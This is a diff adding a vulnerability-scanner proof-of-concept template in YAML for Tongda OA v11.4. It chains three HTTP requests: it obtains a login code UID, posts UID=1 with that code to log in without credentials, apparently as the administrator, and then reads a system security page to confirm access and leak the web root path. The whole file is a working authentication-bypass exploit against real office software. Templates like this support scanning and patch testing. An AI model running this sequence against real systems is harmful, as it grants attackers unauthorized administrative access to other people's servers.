@@ -1,0 +1,35 @@
+name: poc-yaml-tongda-oa-v11-4-webroot-poc
+rules:
+  - method: GET
+    path: /general/login_code.php?codeuid=1
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
+    follow_redirects: false
+    search: |
+      {"status":1,"code_uid":"{(?P<code_uid>.+?)}"}
+    expression: "true"
+  - method: POST
+    path: /logincheck_code.php
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
+      X-Requested-With: "XMLHttpRequest"
+      Content-Type: "application/x-www-form-urlencoded"
+      Accept-Encoding: "gzip, deflate"
+    follow_redirects: false
+    body:
+      UID=1&CODEUID={{code_uid}}
+    expression: |
+      response.status == 200 && response.body.bcontains(b"\"status\":1")
+  - method: GET
+    path: /general/system/security/service.php
+    headers:
+      Accept-Encoding: "gzip, deflate"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"WEBROOT")
+detail:
+  author: rootklt (https://github.com/rootklt)
+  tongda_version: 11.4
+  links:
+    - https://github.com/zrools/tools/blob/master/python/tongda_v11.4_get_webroot_poc.py
